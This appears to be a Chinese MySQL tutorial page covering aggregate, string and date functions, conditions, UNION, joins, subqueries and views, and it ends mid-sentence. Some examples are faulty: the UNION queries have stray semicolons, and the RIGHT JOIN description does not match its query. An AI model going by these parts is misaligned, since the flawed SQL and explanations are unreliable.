<h1 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h1><ol>
<li>SUM：计算某个字段的总和。</li>
<li>COUNT：返回某个字段的行数，可以用于计算某个列或整个表中行的数量。</li>
<li>AVG：计算某个字段的平均值。</li>
<li>MIN：找出某个字段的最小值。</li>
<li>MAX：找出某个字段的最大值。</li>
<li>GROUP_CONCAT：将某个字段的值连接成一个字符串，并以逗号分隔。</li>
</ol>
<p>以下是MySQL聚合函数的基本用法及语法格式：</p>
<ol>
<li>SUM</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT SUM(column_name) FROM table_name;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>COUNT</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT COUNT(column_name) FROM table_name;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>AVG</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT AVG(column_name) FROM table_name;<br></code></pre></td></tr></table></figure>

<ol start="4">
<li>MIN</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT MIN(column_name) FROM table_name;<br></code></pre></td></tr></table></figure>

<ol start="5">
<li>MAX</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT MAX(column_name) FROM table_name;<br></code></pre></td></tr></table></figure>

<ol start="6">
<li>GROUP_CONCAT</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT GROUP_CONCAT(column_name SEPARATOR &#x27;,&#x27;) FROM table_name;<br></code></pre></td></tr></table></figure>

<p>其中，<code>column_name</code>为需要进行计算或处理的字段名，<code>table_name</code>为数据表的名称。需要注意的是，在使用GROUP_CONCAT时，可以指定<code>SEPARATOR</code>来指定连接字符串的分隔符，如果没有指定，默认使用逗号作为分隔符。</p>
<h1 id="字符串操作函数"><a href="#字符串操作函数" class="headerlink" title="字符串操作函数"></a>字符串操作函数</h1><h2 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT()"></a>CONCAT()</h2><p>CONCAT函数是用来连接字符串的。</p>
<p>CONCAT函数接受两个或多个参数，并返回这些参数连接后的字符串结果。常见的用法是将两个或多个字段的值拼接成一个新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT CONCAT(first_name, &#x27; &#x27;, last_name) AS full_name FROM users;<br></code></pre></td></tr></table></figure>

<p>上面的语句会查询<code>users</code>表中的<code>first_name</code>和<code>last_name</code>字段，并将这两个字段的值用空格连接起来，作为新的列<code>full_name</code>的值进行返回。</p>
<p>需要注意的是，在使用CONCAT函数时，需要注意参数的顺序以及字符串之间的分隔符。例如，如果要在两个字符串之间添加空格，可以使用空格字符’ ‘作为参数之一。</p>
<h2 id="RIGHT"><a href="#RIGHT" class="headerlink" title="RIGHT()"></a>RIGHT()</h2><p>RIGHT函数返回一个字符串的右侧指定长度的子字符串。使用时需要指定两个参数：要截取的字符串和需要返回的字符长度。</p>
<p>例如，下面的语句会查询<code>users</code>表中的<code>username</code>字段，并返回该字段后两个字符组成的新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT RIGHT(username, 2) AS last_two_chars FROM users;<br></code></pre></td></tr></table></figure>

<h2 id="SUBSTRING"><a href="#SUBSTRING" class="headerlink" title="SUBSTRING()"></a>SUBSTRING()</h2><p>SUBSTRING函数可以从一个字符串中截取指定位置和长度的子字符串。使用时需要指定三个参数：要截取的字符串、开始的位置（从1开始计数）和需要返回的字符长度。</p>
<p>例如，下面的语句会查询<code>users</code>表中的<code>phone_number</code>字段，并返回该字段第4个字符开始的3个字符组成的新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUBSTRING(phone_number, 4, 3) AS area_code FROM users;<br></code></pre></td></tr></table></figure>

<h2 id="REPEAT"><a href="#REPEAT" class="headerlink" title="REPEAT()"></a>REPEAT()</h2><p>REPEAT函数返回一个重复指定次数的字符串。使用时需要指定两个参数：需要重复的字符串以及需要重复的次数。</p>
<p>例如，下面的语句会返回一个由5个“-”字符组成的新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT REPEAT(&#x27;-&#x27;, 5) AS line FROM users;<br></code></pre></td></tr></table></figure>

<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE()"></a>REVERSE()</h2><p>REVERSE函数返回一个字符串的反转形式，即将字符串中的字符顺序颠倒。使用时只需要指定一个参数，即要翻转的字符串。</p>
<p>例如，下面的语句会查询<code>users</code>表中的<code>username</code>字段，并将该字段的字符顺序全部颠倒：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT REVERSE(username) AS reversed_name FROM users;<br></code></pre></td></tr></table></figure>

<h1 id="日期和时间函数"><a href="#日期和时间函数" class="headerlink" title="日期和时间函数"></a>日期和时间函数</h1><p>MySQL提供了很多日期和时间函数，可以方便地对日期和时间进行处理和计算。以下是一些常用的MySQL日期和时间函数：</p>
<h2 id="NOW"><a href="#NOW" class="headerlink" title="NOW()"></a>NOW()</h2><p>NOW()函数返回当前日期和时间。</p>
<p>例如，下面的语句会查询当前日期和时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT NOW();<br></code></pre></td></tr></table></figure>

<h4 id="DATE"><a href="#DATE" class="headerlink" title="DATE()"></a>DATE()</h4><p>DATE函数从一个日期或日期时间表达式中提取日期部分。</p>
<p>例如，下面的语句会返回当前日期：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DATE(NOW());<br></code></pre></td></tr></table></figure>

<h4 id="TIME"><a href="#TIME" class="headerlink" title="TIME()"></a>TIME()</h4><p>TIME函数从一个日期或日期时间表达式中提取时间部分。</p>
<p>例如，下面的语句会返回当前时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT TIME(NOW());<br></code></pre></td></tr></table></figure>

<h4 id="YEAR"><a href="#YEAR" class="headerlink" title="YEAR()"></a>YEAR()</h4><p>YEAR函数从一个日期或日期时间表达式中提取年份部分。</p>
<p>例如，下面的语句会返回当前年份：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT YEAR(NOW());<br></code></pre></td></tr></table></figure>

<h4 id="MONTH"><a href="#MONTH" class="headerlink" title="MONTH()"></a>MONTH()</h4><p>MONTH函数从一个日期或日期时间表达式中提取月份部分。</p>
<p>例如，下面的语句会返回当前月份：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MONTH(NOW());<br></code></pre></td></tr></table></figure>

<h4 id="DAY"><a href="#DAY" class="headerlink" title="DAY()"></a>DAY()</h4><p>DAY函数从一个日期或日期时间表达式中提取日份部分。</p>
<p>例如，下面的语句会返回当前日期中的天数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DAY(NOW());<br></code></pre></td></tr></table></figure>

<h4 id="HOUR"><a href="#HOUR" class="headerlink" title="HOUR()"></a>HOUR()</h4><p>HOUR函数从一个日期或日期时间表达式中提取小时部分。</p>
<p>例如，下面的语句会返回当前时间中的小时数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT HOUR(NOW());<br></code></pre></td></tr></table></figure>

<h4 id="MINUTE"><a href="#MINUTE" class="headerlink" title="MINUTE()"></a>MINUTE()</h4><p>MINUTE函数从一个日期或日期时间表达式中提取分钟部分。</p>
<p>例如，下面的语句会返回当前时间中的分钟数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MINUTE(NOW());<br></code></pre></td></tr></table></figure>

<h4 id="SECOND"><a href="#SECOND" class="headerlink" title="SECOND()"></a>SECOND()</h4><p>SECOND函数从一个日期或日期时间表达式中提取秒部分。</p>
<p>例如，下面的语句会返回当前时间中的秒数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SECOND(NOW());<br></code></pre></td></tr></table></figure>

<h2 id="DATE-SUB"><a href="#DATE-SUB" class="headerlink" title="DATE_SUB()"></a>DATE_SUB()</h2><p>在 MySQL 中，可以使用 DATE_SUB() 函数和 INTERVAL 子句来查询一个日期字段 c 为五年前的记录。具体语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM table<br>WHERE c = DATE_SUB(NOW(), INTERVAL 5 YEAR);<br></code></pre></td></tr></table></figure>

<p>这个查询语句中，<code>NOW()</code> 函数返回当前时间，<code>DATE_SUB()</code> 函数将当前时间减去 5 年，然后查询满足条件的所有记录。</p>
<h2 id="CURDATE"><a href="#CURDATE" class="headerlink" title="CURDATE()"></a>CURDATE()</h2><p><code>CURDATE()</code> 函数返回系统当前日期。例如，以下查询语句将会返回当前日期：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT CURDATE();<br></code></pre></td></tr></table></figure>

<h2 id="DATEDIFF"><a href="#DATEDIFF" class="headerlink" title="DATEDIFF()"></a>DATEDIFF()</h2><p><code>DATEDIFF(date1, date2)</code> 函数返回两个日期之间的天数差值（即 date1 - date2）。例如，以下查询语句将会计算出今天与指定日期之间的天数差值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DATEDIFF(CURDATE(), &#x27;2022-01-01&#x27;);<br></code></pre></td></tr></table></figure>

<h2 id="DATE-ADD"><a href="#DATE-ADD" class="headerlink" title="DATE_ADD()"></a>DATE_ADD()</h2><p><code>DATE_ADD(date, INTERVAL value unit)</code> 函数可以对给定日期增加或减去一定的时长。其中 <code>date</code> 为基准日期，<code>value</code> 为增加或减少的数值，<code>unit</code> 为时间单位（如 DAY、WEEK、MONTH、YEAR 等）。例如，以下查询语句将会计算出五年前的日期：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DATE_ADD(CURDATE(), INTERVAL -5 YEAR);<br></code></pre></td></tr></table></figure>

<h2 id="DATE-FORMAT"><a href="#DATE-FORMAT" class="headerlink" title="DATE_FORMAT()"></a>DATE_FORMAT()</h2><p>DATE_FORMAT(date, format)<code>函数可以将给定日期格式化成指定的字符串形式。其中</code>date<code> 为待格式化的日期，</code>format&#96; 为日期格式串（如 ‘%Y-%m-%d’ 表示以年、月、日的格式显示日期）。例如，以下查询语句将会格式化出当前日期并输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DATE_FORMAT(CURDATE(), &#x27;%Y-%m-%d&#x27;);<br></code></pre></td></tr></table></figure>

<h1 id="基于条件的查询"><a href="#基于条件的查询" class="headerlink" title="基于条件的查询"></a>基于条件的查询</h1><p>用于创建条件的关键字：</p>
<ul>
<li>WHERE</li>
<li>HAVING</li>
</ul>
<p>用于创建条件的关键字：</p>
<ul>
<li><p>比较运算符（如<code>=</code>，<code>!=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&lt;=</code>，<code>&gt;=</code>，<code>&lt;&gt;</code>）</p>
</li>
<li><p>逻辑运算符（如<code>AND</code>，<code>OR</code>，<code>NOT</code>），<code>IN</code>，<code>EXISTS</code>，<code>BETWEEN</code>，<code>LIKE</code>，<code>IS NULL</code>等</p>
<p>在 MySQL 中，AND、OR 和 NOT 是逻辑运算符，用于连接和组合多个条件表达式。当它们同时出现在一个查询语句中时，需要考虑它们的优先级。</p>
<p>MySQL 中的运算符优先级遵循以下顺序（由高到低）：</p>
<ol>
<li>NOT</li>
<li>AND</li>
<li>OR</li>
</ol>
<p>这意味着，NOT 的优先级最高，所以它会优先计算其后面的条件表达式，然后再应用其他的运算符。而 AND 的优先级比 OR 高，因此，在一个查询语句中，如果同时出现了 AND 和 OR 运算符，AND 会先于 OR 进行计算。</p>
<p>为了避免运算符优先级带来的不必要的困惑，我们可以使用圆括号来明确指定某些条件的计算顺序。具体来说，使用括号可以将几个条件组合在一起，并确保它们在适当的顺序下进行计算。</p>
<p>下面是一个例子，演示了如何在查询语句中使用括号控制条件表达式的计算顺序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM mytable<br>WHERE (col1 = &#x27;value1&#x27; OR col2 = &#x27;value2&#x27;)<br>AND col3 &gt; 100;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，首先使用括号指定 OR 条件的计算顺序，然后再结合 AND 运算符对这些条件进行组合。它的作用相当于检索 col1 等于 ‘value1’，或者 col2 等于 ‘value2’，并且 col3 大于 100 的所有行。</p>
</li>
</ul>
<h1 id="使用多个表"><a href="#使用多个表" class="headerlink" title="使用多个表"></a>使用多个表</h1><h2 id="联合查询（UNION）"><a href="#联合查询（UNION）" class="headerlink" title="联合查询（UNION）"></a>联合查询（UNION）</h2><p>在 MySQL 中，<code>UNION</code> 关键字用于将两个或多个 <code>SELECT</code> 语句的结果集合并成一个结果集。<code>UNION</code> 可以去除重复行，而 <code>UNION ALL</code> 则包含所有的行（包括重复行）。以下是 <code>UNION</code> 和 <code>UNION ALL</code> 的语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- UNION 示例<br>SELECT column1, column2, ... FROM table1<br>UNION<br>SELECT column1, column2, ... FROM table2;<br>UNION<br>SELECT column1, column2, ... FROM table3;<br>...<br><br>-- UNION ALL 示例<br>SELECT column1, column2, ... FROM table1<br>UNION ALL<br>SELECT column1, column2, ... FROM table2;<br>UNION ALL<br>SELECT column1, column2, ... FROM table3;<br>...<br></code></pre></td></tr></table></figure>

<p>在这个示例中，我们可以通过 <code>UNION</code> 合并两个表的查询结果，并返回所有不重复的行；或者通过 <code>UNION ALL</code> 合并两个表的查询结果，并返回所有行，包括重复行。</p>
<p>需要注意的是，在使用 <code>UNION</code> 或 <code>UNION ALL</code> 进行结果集合并时，两个 <code>SELECT</code> 语句必须满足以下条件：</p>
<ul>
<li>SELECT 语句中列数必须相同。</li>
<li>列类型必须相似或可隐式转换。</li>
<li>结果集中的列名来自第一个 SELECT 语句，后续的 SELECT 语句只能：<ul>
<li>与第一个 SELECT 语句中的列具有相同的名称，或者</li>
<li>为其列命名以匹配结果集的结构。</li>
</ul>
</li>
</ul>
<p>例如，以下是一个 <code>UNION</code> 操作的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT name, age FROM table1<br>UNION<br>SELECT name, age FROM table2;<br>UNION<br>SELECT name, age FROM table3;<br></code></pre></td></tr></table></figure>

<p>这里我们将查询结果按照 <code>name</code> 和 <code>age</code> 两列进行合并，如果存在相同的行则只返回一次。需要注意的是，<code>UNION</code> 操作会对结果集进行排序和去重操作，因此可能需要-根据实际情况调整查询语句的顺序和筛选条件。</p>
<p>总而言之，在 MySQL 中使用 <code>UNION</code> 和 <code>UNION ALL</code> 可以使我们方便地将多个查询结果组合在一起，并可以选择是否保留重复行。</p>
<h2 id="内连接（INNER-JOIN）"><a href="#内连接（INNER-JOIN）" class="headerlink" title="内连接（INNER JOIN）"></a>内连接（INNER JOIN）</h2><p>INNER JOIN操作用于连接两个表并返回匹配的行，只有当在关联列中两个表都存在匹配时才会返回结果。除此之外，还有一种相似的语法格式叫做“JOIN…ON…”，其效果与INNER JOIN完全相同。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column_name(s) FROM table1 <br>INNER JOIN table2 <br>ON table1.column_name = table2.column_name;<br></code></pre></td></tr></table></figure>

<p>使用示例：<br>查询商品表和订单表中有关联的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT orders.id, orders.order_date, products.product_name<br>FROM orders<br>INNER JOIN products<br>ON orders.product_id = products.id;<br></code></pre></td></tr></table></figure>

<p>在上面的例子中，我们连接了“商品”表和“订单”表，并使用ON子句指定了连接条件（“product_id”），结果集包括了这两个表中符合连接条件的数据。</p>
<h2 id="ON和USING"><a href="#ON和USING" class="headerlink" title="ON和USING"></a>ON和USING</h2><p>MySQL ON是一种在两个表之间进行连接的常用方法，通过指定连接条件来连接两个表并返回符合条件的结果。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT column_name(s) FROM table1 JOIN table2 ON table1.column_name = table2.column_name;<br></code></pre></td></tr></table></figure>

<p>其中，table1和table2是要连接的表，column_name是连接两个表的共同列名。</p>
<p>使用示例：<br>查询所有部门和员工数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT departments.department_name, employees.first_name, employees.last_name<br>FROM departments<br>JOIN employees ON departments.department_id = employees.department_id;<br></code></pre></td></tr></table></figure>

<p>需要注意的是，在使用ON子句时，可以比较不同类型的数据，如数字、文本等。在连接多个表时，也可以在ON子句中使用逻辑运算符（例如AND和OR），以指定更复杂的连接条件。</p>
<p>MySQL USING是一种简化JOIN操作的方法，该操作将在两个表之间使用共同的列进行连接。这样可以避免在ON子句的连接条件中重复指定相同列名，从而使查询更加简洁。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column_name(s) FROM table1 JOIN table2 USING (column_name);<br></code></pre></td></tr></table></figure>

<p>其中，table1和table2是要连接的表，column_name是连接两个表的共同列名。</p>
<p>使用示例：<br>查询所有部门和员工数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT departments.department_name, employees.first_name, employees.last_name<br>FROM departments<br>JOIN employees <br>USING (department_id);<br></code></pre></td></tr></table></figure>

<p>需要注意的是，USING只能用于比较两个表中具有相同名称的列，如上面的例子中的department_id。如果两个表的连接条件的列名称不同，则必须使用ON子句来指定要连接的列</p>
<h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><h4 id="左外连接（LEFT-JOIN）"><a href="#左外连接（LEFT-JOIN）" class="headerlink" title="左外连接（LEFT JOIN）"></a>左外连接（LEFT JOIN）</h4><p>LEFT JOIN操作连接左侧的表和右侧的表，并返回左侧表的所有记录以及满足连接条件的右侧表的记录，如果没有匹配的行，则该结果集中的右侧表的字段将被设置为NULL值。</p>
<p>LEFT JOIN也可以写成LEFT OUTER JOIN</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column_name(s) FROM table1 <br>LEFT [OUTER] JOIN table2 <br>ON table1.column_name = table2.column_name;<br></code></pre></td></tr></table></figure>

<p>使用示例：<br>查询所有的部门和员工数据以及那些没有员工的部门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT departments.department_name, employees.first_name, employees.last_name<br>FROM departments<br>LEFT JOIN employees<br>ON departments.department_id = employees.department_id;<br></code></pre></td></tr></table></figure>

<p>在上面的例子中，我们连接了“部门”和“员工”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的部门和符合连接条件的员工信息，即使某些部门没有员工也会显示出来。</p>
<h4 id="右外连接（RIGHT-JOIN）"><a href="#右外连接（RIGHT-JOIN）" class="headerlink" title="右外连接（RIGHT JOIN）"></a>右外连接（RIGHT JOIN）</h4><p>RIGHT JOIN操作连接右侧的表和左侧的表，并返回右侧表的所有记录以及满足连接条件的左侧表的记录。如果没有匹配的行，则该结果集中的左侧字段将被设置为NULL值。</p>
<p>RIGHT JOIN也可以写成RIGHT OUTER JOIN</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column_name(s) FROM table1 <br>RIGHT [OUTER] JOIN table2 <br>ON table1.column_name = table2.column_name;<br></code></pre></td></tr></table></figure>

<p>使用示例：<br>查询所有的员工数据以及那些没有被分配到部门的员工</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT employees.first_name, employees.last_name, departments.department_name<br>FROM employees<br>RIGHT JOIN departments<br>ON employees.department_id = departments.department_id;<br></code></pre></td></tr></table></figure>

<p>在上面的例子中，我们连接了“员工”和“部门”两个表，并使用ON子句指定了共同字段（“department_id”），因此返回的结果集包括了所有的员工信息和与之相关的部门信息，即使某些员工没有分配到部门也会显示出来。</p>
<p>LEFT JOIN和RIGHT JOIN可以用于处理一对多、多对一的关系查询</p>
<h2 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h2><p>自连接是将表与其自身同名的表进行连接</p>
<p>在MySQL中，使用自连接时需要使用别名（alias）来区分每个表实例。以下是一个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT a.employee_name, b.employee_name<br>FROM employee a, employee b<br>WHERE a.manager_id = b.employee_id;<br></code></pre></td></tr></table></figure>

<p>在上面的例子中，我们查询了“employee”表中所有员工的名称和他们各自的经理的名称。为此，我们需要对“employee”表进行自连接，以将每个员工与其经理联系起来。这里我们使用a和b两个别名来表示同一个表中的两个不同实例。在上面的例子中，我们在WHERE子句中指定连接条件“manager_id &#x3D; b.employee_id”，这意味着我们正在连接的是一个员工和他的经理。</p>
<p>或者也可以使用内连接关键字进行自连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT a.emp_id, b.emp_name AS manager_name<br>FROM employee a<br>JOIN employee b<br>ON a.manager_id = b.emp_id;<br></code></pre></td></tr></table></figure>

<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p>通俗的讲，在SELECT的记录中SELCT就是子查询。子查询是在查询中使用一个查询作为另一个查询的子集。使用子查询可以轻松地扩展查询功能并实现更复杂的条件过滤机制。</p>
<p>下面是一个示例，该示例演示如何使用子查询：</p>
<p>假设您有两个表：Orders和Customers，分别存储订单和客户的信息。现在，假设您想要查询所有来自某些城市的顾客的订单详细信息。您可以使用以下查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *<br>FROM Orders<br>WHERE customer_id IN (<br>  SELECT customer_id<br>  FROM Customers<br>  WHERE city = &#x27;New York&#x27;<br>);<br></code></pre></td></tr></table></figure>

<p>这个查询中，内部SELECT语句是一个子查询，它返回所有位于“New York”城市的客户ID。外部SELECT语句使用WHERE子句来过滤Orders表中包含在子查询结果集中的customer_id值的行，并将行返回到结果集中。</p>
<p>下面是另一个示例：</p>
<p>提取大于等于平均值的记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *<br>FROM tb1<br>WHERE age &gt;= (<br>	SELECT AVG(age) FROM tb1<br>)<br></code></pre></td></tr></table></figure>

<p>下面是使用IN的子查询的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column_name1, column_name2... <br>FROM table_name<br>WHERE column_name IN (通过子查询SELECT语句提取的列)<br></code></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT empid, name<br>	FROM tb1<br>WHERE empid <br>	IN (SELECT empid FROM tb2);<br></code></pre></td></tr></table></figure>

<p>下面是使用EXISTS的子查询的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT column_name1, column_name2... <br>FROM table_name<br>WHERE EXISTS (通过子查询SELECT语句提取的列);<br></code></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *<br>	FROM tb1<br>WHERE EXISTS<br>	(SELECT * FROM tb2 WHERE tb1.empid=tb2.empid);<br></code></pre></td></tr></table></figure>

<h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><blockquote>
<p>将SELECT结果像表一样保存下来的虚表就是视图</p>
<p>任何更改基本表的操作（如INSERT、UPDATE或DELETE）都会影响到视图的结果</p>
<p>视图也可以和表一样进行SELECT、INSERT、UPDATE、DELETE……</p>
<p>视图可以帮助简化复杂查询，提高查询性能</p>
</blockquote>
<h2 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h2><p>使用CREATE VIEW语句可以在MySQL中创建视图。例如，以下是创建一个简单视图的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE VIEW my_view AS<br>SELECT column1, column2, ...<br>FROM my_table<br>WHERE condition;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，my_view是视图的名称，my_table是视图所依赖的基本表，SELECT查询表示视图的内容，并使用WHERE子句进行条件过滤。</p>
<h2 id="可更新视图"><a href="#可更新视图" class="headerlink" title="可更新视图"></a>可更新视图</h2><p>在MySQL中，只有可更新视图（updatable view）才能使用UPDATE、INSERT或DELETE语句来更改基表的行数据。</p>
<p>当满足以下条件之一时，视图将被标记为不可更新：</p>
<ol>
<li>视图包含聚合函数（如SUM或AVG）。</li>
<li>视图中使用了DISTINCT、GROUP BY或HAVING子句。</li>
<li>视图中的SELECT语句包含UNION或UNION ALL操作符。</li>
<li>视图定义中存在子查询，而且子查询引用了与SELECT语句所引用的不同表。</li>
<li>视图定义中存在常量或表达式，而不是列名。</li>
</ol>
<p>对视图执行INSERT操作时，即使与创建视图时的WHERE条件不匹配，数据也会插入到基表中。</p>
<p>比如创建视图时指定了sales的范围：</p>
